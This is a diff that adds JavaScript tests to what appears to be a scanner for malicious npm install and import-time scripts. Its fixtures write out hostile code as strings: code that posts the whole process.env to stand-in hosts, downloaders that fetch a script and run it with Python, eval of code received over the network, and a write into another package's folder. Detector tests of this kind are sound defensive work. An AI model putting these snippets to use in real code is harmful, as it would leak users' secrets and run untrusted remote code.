@@ -183,6 +183,92 @@ test("aliased decoders and decrypted payloads in the decode flow", () => {
   assert.deepEqual(found("from base64 import b64encode as enc\nexec(enc(b'x'))\n"), []);
 });
 
+test("what a script puts into a container, the container holds (D-3)", () => {
+  // the tree model knew an array's push and unshift on a name alone (python: ContainerTests)
+  const send = (body) => `fetch('https://x.invalid/c', {method: 'POST', body: ${body}});\n`;
+  for (const [fill, body] of [
+    ["const c = new FormData();\nc.append('e', JSON.stringify(process.env));\n", "c"],
+    ["const c = new Map();\nc.set('e', process.env);\n", "JSON.stringify(Object.fromEntries(c))"],
+    ["const c = new Set();\nc.add(JSON.stringify(process.env));\n", "JSON.stringify([...c])"],
+    ["const c = {};\nObject.assign(c, { e: process.env });\n", "JSON.stringify(c)"],
+  ]) {
+    assert.deepEqual(installScriptRisk(fill + send(body), true, false, "js"),
+      ["sends environment variables over the network (the whole environment)"], fill);
+  }
+  assert.deepEqual(installScriptRisk("const c = new Map();\nc.set('e', process.env);\n" + send("'ok'"), true, false, "js"), []);
+});
+
+test("a method reads this as the instance it is called on, in a class made in several places (B-3)", () => {
+  // python: InstanceTests
+  const cls = "class R {\n  setCode(t) { this.c = t; }\n  go() { this.run(); }\n  run() { eval(this.c); }\n}\n" +
+    "const a = new R();\nconst b = new R();\n";
+  const get = (call) => "const https = require('https');\nhttps.get('https://x.invalid/c', (res) => {\n  let d = '';\n" +
+    `  res.on('data', (c) => { d += c; });\n  res.on('end', () => { a.setCode(d); ${call}; });\n});\n`;
+  for (const call of ["a.run()", "a.go()"]) {
+    assert.ok(importTimeRisk(cls + get(call), "js")[0].includes("runs code it receives over the network"), call);
+  }
+  assert.ok(!importTimeRisk(cls + get("b.run()"), "js")[0].includes("runs code it receives over the network"));
+});
+
+test("a member's container holds what it is given, apart from the object (D-3b)", () => {
+  // python: MemberContainerTests
+  const send = (body) => `fetch('https://x.invalid/c', {method: 'POST', body: ${body}});\n`;
+  const cls = (keep, body) => "class C {\n  constructor() { this.items = []; this.name = 'x'; }\n  keep() { " + keep
+    + " }\n  send() { " + send(body) + " }\n}\nconst c = new C();\nc.keep();\nc.send();\n";
+  for (const text of [
+    "const o = { list: [] };\no.list.push(process.env);\n" + send("JSON.stringify(o.list)"),
+    "const o = { opts: {} };\nObject.assign(o.opts, { e: process.env });\n" + send("JSON.stringify(o.opts)"),
+    cls("this.items.push(process.env);", "JSON.stringify(this.items)"),
+  ]) {
+    assert.deepEqual(installScriptRisk(text, true, false, "js"),
+      ["sends environment variables over the network (the whole environment)"], text);
+  }
+  for (const text of ["const o = { list: [], name: 'x' };\no.list.push(process.env);\n" + send("o.name"),
+    cls("this.items.push(process.env);", "this.name")]) {
+    assert.deepEqual(installScriptRisk(text, true, false, "js"), [], text);
+  }
+});
+
+test("a download a callback is given, written to a file and run (D-2)", () => {
+  // the request client's body, https.get's chunks, a pipe into a file (python: test_droppers.CallbackTests)
+  const head = "const fs = require('fs');\nconst { exec } = require('child_process');\nconst p = '/tmp/x.py';\n";
+  for (const shape of [
+    "const request = require('request');\nrequest.get('https://h.invalid/x.py', (e, r, b) => { fs.writeFileSync(p, b); exec('python3 ' + p); });\n",
+    "const https = require('https');\nhttps.get('https://h.invalid/x.py', (res) => { let d = ''; res.on('data', (c) => { d += c; }); res.on('end', () => { fs.writeFileSync(p, d); exec('python3 ' + p); }); });\n",
+    "const https = require('https');\nhttps.get('https://h.invalid/x.py', (res) => { const f = fs.createWriteStream(p); res.pipe(f); f.on('finish', () => exec('python3 ' + p)); });\n",
+  ]) {
+    assert.deepEqual(installScriptRisk(head + shape, true, false, "js"), ["downloads a script and runs it with Python"], shape);
+    assert.deepEqual(importTimeRisk(head + shape, "js")[0], ["downloads a script and runs it with Python"], shape);
+  }
+  // a download kept, nothing run: no reason of the tree's (the text detector's is as before)
+  const kept = importTimeRisk(head + "require('https').get('https://h.invalid/x.py', (res) => { res.pipe(fs.createWriteStream(p)); });\n", "js")[0];
+  assert.ok(!kept.some((r) => r.includes("runs it with")), kept.join("; "));
+});
+
+test("code written into another package's folder (D-9)", () => {
+  // @dinzid04/libsignal-node 2.2.5's shape (python: test_rewrites.py)
+  const text = "const fs = require('fs');\nconst path = require('path');\n" +
+    "const base = require.resolve('@whiskeysockets/baileys/package.json').replace('/package.json', '');\n" +
+    "fs.writeFileSync(path.join(base, 'lib', 'Socket', 'newsletter.js'), 'exports.x = 1;');\n";
+  assert.deepEqual(importTimeRisk(text, "js")[0], ["rewrites another package's code (@whiskeysockets/baileys)"]);
+  assert.deepEqual(installScriptRisk(text, true, false, "js"), ["rewrites another package's code (@whiskeysockets/baileys)"]);
+  // a data file there is not code
+  assert.deepEqual(importTimeRisk(text.replace("newsletter.js", "data.json"), "js")[0], []);
+});
+
+test("the environment held or copied, read by a member's name (D-16); a JSON file given require (D-18)", () => {
+  // prisma 8.0.0-rc.21's shape and corepack 0.36.0's (python: test_env_copies.py)
+  const send = (v) => `fetch('https://collect.invalid/c', { method: 'POST', body: ${v} });\n`;
+  const prisma = "function base(env = process.env) { return env.API_URL || 'https://api.invalid'; }\n" + send("base()");
+  assert.deepEqual(importTimeRisk(prisma, "js")[0], []);
+  assert.deepEqual(importTimeRisk("const env = { ...process.env };\n" + send("JSON.stringify(env)"), "js")[0],
+    ["reads credentials or the whole environment and sends data over the network"]);
+  const dl = (end) => "const https = require('https');\nhttps.get('https://dl.invalid/m', (res) => { let d = ''; " +
+    `res.on('data', (c) => d += c); res.on('end', () => { ${end} }); });\n`;
+  assert.deepEqual(importTimeRisk(dl("require(require('path').join('/tmp', d, 'package.json'));"), "js")[0], []);
+  assert.deepEqual(importTimeRisk(dl("require(d);"), "js")[0], ["loads a module named by data it receives over the network"]);
+});
+
 test("linear time on hostile texts", () => {
   for (const text of ["powershell ".repeat(50_000), "powershell -e " + "A".repeat(400_000), "'".repeat(200_000) + "exec http",
     "dup2(".repeat(100_000), "$(whoami)".repeat(50_000), "iwr ".repeat(100_000) + "| iex"]) {
